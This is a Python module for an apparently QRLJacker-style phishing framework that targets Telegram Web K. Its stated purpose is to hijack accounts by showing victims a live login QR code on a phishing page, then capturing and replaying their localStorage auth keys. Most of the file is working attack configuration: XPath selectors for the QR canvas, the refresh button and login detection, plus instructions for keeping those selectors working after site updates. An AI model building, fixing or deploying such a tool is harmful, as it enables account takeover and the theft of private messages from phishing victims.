# -*- coding: utf-8 -*-
# Telegram QR-session grabber
# Target: https://web.telegram.org/k/ (Telegram Web K — the stable version)
#
# DOM Research Notes (Web K = tweb by morethanwords, built on React/TypeScript):
# ─────────────────────────────────────────────────────────────────────────────
# QR Code:
#   Telegram Web K renders the QR code as a <canvas> element inside the auth
#   page. The canvas sits inside a div with class containing "auth-qr-code" or
#   similar. The React component is AuthCode / QrLogin. The canvas is the only
#   canvas visible on the login page.
#
# Session type = localstorage:
#   After a successful QR scan, Telegram Web K stores auth keys in localStorage
#   (keys like "user_auth", "dc", MTProto session data). Cookies do NOT carry
#   the session — localStorage injection is the correct replay method.
#
# Post-login detection:
#   After scan, Web K transitions to the main chat interface. Key stable
#   indicators: the left column with chat list, the compose/search bar,
#   or the settings gear icon.
#
# Selector strategy (most-specific → most-generic):
#   1. data-* / class attributes from tweb source (stable across minor updates)
#   2. Role + aria-label (accessibility tree — very stable)
#   3. Structural canvas fallback (only canvas on login page)
# ─────────────────────────────────────────────────────────────────────────────

from core.module_utils import types


class info:
    author = "Puneet Chandra Chaudhary - D0C70R"
    short_description = "Telegram QR-sessions grabber and controller (Web K)"
    full_description = (
        "Hijacks Telegram Web K (web.telegram.org/k/) sessions via QR code. "
        "Serves a phishing page with a live-updated QR. When the victim scans, "
        "their localStorage session (auth keys) is captured and replayed. "
        "Works independently of the victim's phone remaining online."
    )


class execution:
    module_type = types.grabber
    name = "telegram"
    url = "https://web.telegram.org/k/"
    session_type = "localstorage"

    # =========================================================================
    # QR CODE CANVAS XPATHS  (Telegram Web K — tweb)
    # =========================================================================
    # Web K is a React SPA. The QR is drawn on a <canvas> inside a dedicated
    # auth/login section. The canvas element is unique on the login page.
    #
    # Strategy:
    #   1. canvas inside element with class "auth-qr-code" (tweb class)
    #   2. canvas inside element with class containing "qr" (broader match)
    #   3. canvas inside the auth/login page wrapper div
    #   4. Any canvas not in header/footer (broadest fallback)
    # =========================================================================

    # --- Primary: canvas inside Telegram Web K's QR code container ----------
    # tweb renders auth with class "auth-qr-code" wrapping the canvas
    image_xpath = '//div[contains(@class,"auth-qr-code")]//canvas'

    # --- Alt 1: canvas inside any element with "qr" in class ----------------
    image_xpath_alt1 = (
        '//div[contains(@class,"qr") or contains(@class,"Qr") or contains(@class,"QR")]'
        + "//canvas"
    )

    # --- Alt 2: canvas inside the login/auth page container -----------------
    # tweb's auth page has class "page-sign" or "auth-pages"
    image_xpath_alt2 = (
        '//div[contains(@class,"page-sign") or contains(@class,"auth-pages")]'
        "//canvas"
    )

    # --- Alt 3: any canvas with aria-label mentioning scan/QR ---------------
    image_xpath_alt3 = (
        '//canvas[contains(@aria-label,"QR") or contains(@aria-label,"qr") '
        'or contains(@aria-label,"scan") or contains(@aria-label,"Scan")]'
    )

    # --- Alt 4: broadest canvas fallback ------------------------------------
    image_xpath_alt4 = (
        "//canvas[not(ancestor::header) and not(ancestor::footer) "
        "and not(ancestor::nav)]"
    )

    # =========================================================================
    # QR RELOAD / REFRESH BUTTON XPATHS
    # =========================================================================
    # Telegram Web K shows a "QR code expired" overlay after ~30 s.
    # The overlay has a button/div to re-generate the token.
    # =========================================================================

    img_reload_button = (
        '//button[contains(@class,"btn-primary") '
        'and contains(normalize-space(.),"Scan")]'
    )
    img_reload_btn_alt = (
        '//button[contains(normalize-space(.),"Refresh") '
        'or contains(normalize-space(.),"refresh") '
        'or contains(normalize-space(.),"Reload")]'
    )
    img_reload_btn_alt2 = (
        '//div[contains(@class,"qr-expired") or contains(@class,"qr-refresh")]//button'
    )
    img_reload_btn_alt3 = None

    # =========================================================================
    # SESSION / LOGIN SUCCESS DETECTION XPATHS
    # =========================================================================
    # After QR scan, Web K loads the main chat interface.
    # Most reliable signals post-login:
    #   - The chat list column (left sidebar)
    #   - The "New Message" compose button
    #   - The search input in the chat list
    #   - The menu/settings button in the top bar
    # =========================================================================

    # Primary: left sidebar chat list element (always present post-login)
    change_identifier = '//div[contains(@class,"chatlist") or @id="chatlist"]'

    # Alt 1: compose / new message button in sidebar
    change_id_android = (
        '//button[contains(@class,"btn-menu-item") '
        'and contains(normalize-space(.),"New")]'
    )

    # Alt 2: search input inside the chat list panel
    change_id_ios = (
        '//input[contains(@class,"input-search") or contains(@placeholder,"Search")]'
    )

    # Alt 3: the hamburger/main menu button that only appears when logged in
    change_id_alt = (
        '//button[contains(@class,"btn-icon") and contains(@class,"sidebar")]'
    )

    # =========================================================================
    # SELECTOR MAINTENANCE NOTES
    # =========================================================================
    # If ALL selectors fail after a Telegram Web K update:
    #
    # 1. Open https://web.telegram.org/k/ in your browser.
    # 2. Open DevTools → Elements; locate the QR <canvas>.
    # 3. Find the nearest ancestor with a stable class (e.g. "auth-qr-code").
    # 4. Update image_xpath accordingly.
    # 5. For session detection, after a test-scan look for the first element
    #    that only appears in the logged-in chat view. The class "chatlist"
    #    or an element with id="chatlist" is a strong stable candidate.
    #
    # Known Telegram Web K (tweb) DOM attributes (2025-06):
    #   QR container:      div.auth-qr-code (wraps the canvas)
    #   Auth page:         div.page-sign / div.auth-pages
    #   Chat list:         div.chatlist / div#chatlist
    #   Search input:      input.input-search
    #   QR token expires:  every ~30 s — watch for the refresh overlay
    #
    # Session type note:
    #   Telegram Web K stores MTProto auth keys in localStorage, not cookies.
    #   The key "user_auth" confirms a logged-in state.
    #   Use "sessions -i <id>" → loads via load_localstorage().
    # =========================================================================
